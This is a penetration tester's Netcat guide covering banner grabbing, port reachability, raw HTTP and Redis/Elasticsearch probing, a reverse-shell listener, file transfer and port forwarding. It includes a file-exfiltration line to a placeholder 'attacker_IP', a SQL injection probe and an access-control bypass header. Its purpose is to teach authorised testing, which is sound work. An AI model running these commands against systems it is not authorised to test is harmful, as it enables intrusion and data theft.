# Netcat — Enterprise Penetration Testing Usage Guide

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 6+ Years Enterprise AppSec
>
> **Category:** Tool Mastery — Network Swiss Army Knife
>
> **Context:** Netcat is one of the most deceptively simple yet powerful tools in enterprise testing. No installation of libraries, no complex flags — a raw TCP/UDP pipe with a command line interface. I use Netcat daily in enterprise engagements for banner grabbing, port reachability testing, service interaction, and as a listener for reverse shell proof-of-concept demonstrations during authorised exploitation confirmation.

---

## 🔧 Core Use Cases in Enterprise Testing

### 1 — Banner Grabbing & Service Fingerprinting

```bash
# Grab HTTP banner from web server
nc -nv target.company.com 80
# After connecting, type:
HEAD / HTTP/1.0
[Enter twice]
# Response reveals: Server version, X-Powered-By, Date format

# Grab HTTPS banner (use openssl for TLS)
openssl s_client -connect target.company.com:443 -quiet
# After connecting:
HEAD / HTTP/1.0
[Enter twice]

# Grab SMTP banner (reveals mail server version)
nc -nv mail.company.com 25
# Server auto-responds: 220 mail.company.com ESMTP Microsoft Exchange

# Grab FTP banner
nc -nv ftp.company.com 21
# Server: 220 FileZilla Server 0.9.41 beta

# Grab SSH banner
nc -nv target.company.com 22
# Server: SSH-2.0-OpenSSH_7.4
# Version informs CVE lookup (OpenSSH 7.4 = check CVE-2016-6515)

# Redis banner
nc -nv 10.0.14.55 6379
# Type: INFO server
# Server responds with full Redis version and config
# No password prompt = unauthenticated = Critical finding

# Elasticsearch banner
nc -nv 10.0.14.88 9200
# Type: GET / HTTP/1.0 then Enter twice
# Response: {"name":"node-1","cluster_name":"..."} = unauthenticated = Critical
```

### 2 — Port Reachability Testing

```bash
# Test if a specific port is reachable (faster than nmap for single checks)
nc -zv target.company.com 443
# Output: Connection to target.company.com 443 port [tcp/https] succeeded!
# Or:    nc: connect to target.company.com port 443 (tcp) failed

# Test a range of ports
nc -zv target.company.com 80-443

# Test UDP port reachability
nc -zuv target.company.com 161   # SNMP
nc -zuv target.company.com 53    # DNS

# Test internal service connectivity (after gaining internal access)
# Check if application server can reach database:
nc -zv 10.0.14.100 1433 && echo "SQL reachable" || echo "SQL blocked"
nc -zv 10.0.14.100 6379 && echo "Redis reachable" || echo "Redis blocked"

# Quick sweep of common ports on internal host:
for port in 21 22 23 25 53 80 443 445 1433 3306 3389 5432 6379 8080 9200; do
  nc -zv -w1 10.0.14.55 $port 2>&1 | grep -v "refused"
done
```

### 3 — Interactive Service Testing

```bash
# Test HTTP endpoints without a browser or Burp
nc -nv target.company.com 80 << 'EOF'
GET /admin HTTP/1.1
Host: target.company.com
Connection: close

EOF
# Raw HTTP response — useful for testing header injection, method tampering

# Test for HTTP method acceptance
nc -nv target.company.com 80 << 'EOF'
DELETE /api/users/1042 HTTP/1.1
Host: target.company.com
Connection: close

EOF
# If 200 response = DELETE method enabled without auth = Critical

# Send custom headers to test header injection
nc -nv target.company.com 80 << 'EOF'
GET / HTTP/1.1
Host: target.company.com
X-Original-URL: /admin
Connection: close

EOF

# Interact with Redis directly (no redis-cli required)
nc -nv 10.0.14.55 6379 << 'EOF'
INFO server
CONFIG GET *
KEYS *
EOF
# Each command on a new line — Redis responds to each
```

### 4 — Reverse Shell Listener (Authorised PoC Only)

```bash
# Start a listener on attacker machine (to receive reverse shell)
# Used ONLY during explicitly authorised exploitation confirmation

# Listener on attacker machine:
nc -nlvp 4444
# -n: no DNS resolution
# -l: listen mode
# -v: verbose
# -p: port

# When reverse shell connects:
# Document: hostname, whoami output
# Then close immediately: Ctrl+C

# Transfer files via Netcat (after authorised shell — for PoC file retrieval)
# Receiver side (attacker machine):
nc -nlvp 5555 > received_file.txt
# Sender side (target — in authorised PoC context):
nc attacker_IP 5555 < /etc/hostname
```

### 5 — Simple Port Forwarding for Internal Access

```bash
# After authorised internal access — forward internal service to local port
# Access internal SQL Server (1433) via local port 13330:
ncat --sh-exec "ncat 10.0.14.100 1433" -l 13330 --keep-open

# Now connect locally:
sqlcmd -S 127.0.0.1,13330 -U sa -P 'password'

# Note: ncat (Nmap's version) has more features than traditional nc
# Install: apt install ncat
```

---

## 🏢 Enterprise Testing Scenarios

### Scenario 1 — Verifying Firewall Rules

```bash
# Client says "Redis is only accessible internally"
# Verify from external network:
nc -zv target.company.com 6379
# Expected: Connection refused (firewall blocking)
# Actual finding: Connection succeeded = firewall not enforcing rule

# Document:
# Finding: Redis Port 6379 Accessible from External Network
# Evidence: nc -zv target.company.com 6379 → Connection succeeded
# Risk: Unauthenticated Redis exposed to internet
```

### Scenario 2 — Manual SQLi Input Testing via Raw HTTP

```bash
# Send raw SQL injection test payload via Netcat
nc -nv target.company.com 80 << 'EOF'
GET /api/reports?ref=1' HTTP/1.1
Host: target.company.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9...
Connection: close

EOF
# If response contains SQL error = SQL injection confirmed
# More reliable than URL-encoding in some edge cases
```

### Scenario 3 — Service Interaction Documentation

```bash
# Document exactly what an unauthenticated service exposes
# (for report evidence)

# Elasticsearch — what data is accessible without auth:
nc -nv 10.0.14.88 9200 << 'EOF'
GET /_cat/indices?v HTTP/1.0

EOF
# Response lists all index names = confirms data accessible without auth

# Redis — what is cached:
nc -nv 10.0.14.55 6379 << 'EOF'
INFO keyspace
DBSIZE
EOF
# Confirms how many keys are stored = scale of exposure
```

---

## 📋 Enterprise Report — Netcat Evidence

```
Finding Title: Redis Service Accessible from Internet Without Authentication

Severity: Critical | CVSS: 9.8

Evidence:
  # Command:
  nc -nv target.company.com 6379

  # Output:
  Connection to target.company.com 6379 port [tcp] succeeded!

  # Interactive test — INFO command without any credentials:
  INFO server
  # redis_version:6.2.1
  # tcp_port:6379
  # os:Linux 5.4.0 x86_64
  # [full server info returned without authentication]

  # Key count:
  DBSIZE
  :48294    ← 48,294 keys accessible without authentication

Impact:
  Any attacker can read all 48,294 cached entries including session
  tokens, user data, and API keys without providing any credentials.

Remediation:
  requirepass <strong_random_password>  in redis.conf
  bind 127.0.0.1  (restrict Redis to localhost)
  Firewall: block port 6379 from all external IP ranges
```

---

## 🧭 Key Takeaways

**1. Netcat for banner grabbing is faster than Nmap for single-service checks.**
When you need to quickly confirm a service version or check reachability of a specific port, `nc -nv host port` gives you the answer in one second. No Nmap scan startup, no port range scanning — direct connection.

**2. Raw HTTP via Netcat bypasses application-layer processing.**
Some injection payloads behave differently when sent as raw TCP versus through a browser or Burp. Netcat allows sending completely malformed or unusual HTTP requests that reveal server behaviour not observable through normal HTTP clients.

**3. The reverse shell listener is the professional PoC standard.**
When exploitation is authorised, `nc -nlvp 4444` starts your listener, the reverse shell connects, and you capture `hostname` + `whoami`. Screenshot and exit. This is the minimum evidence for an RCE finding — it proves execution without causing any further impact.

**4. Port reachability testing is valuable for validating remediation.**
After a finding like "Redis exposed on internet" is reported and the client says it is fixed, `nc -zv target 6379` in 1 second confirms whether the firewall rule was actually applied. Fast, definitive, no explanation needed.

---

## 🔗 References
- [Netcat Manual](https://man7.org/linux/man-pages/man1/nc.1.html)
- [Ncat (Nmap's Netcat)](https://nmap.org/ncat/)
- [SANS Netcat Cheatsheet](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)

---
<div align="center">

*Part of [AppSec From The Trenches](README.md) — Real notes from 6+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
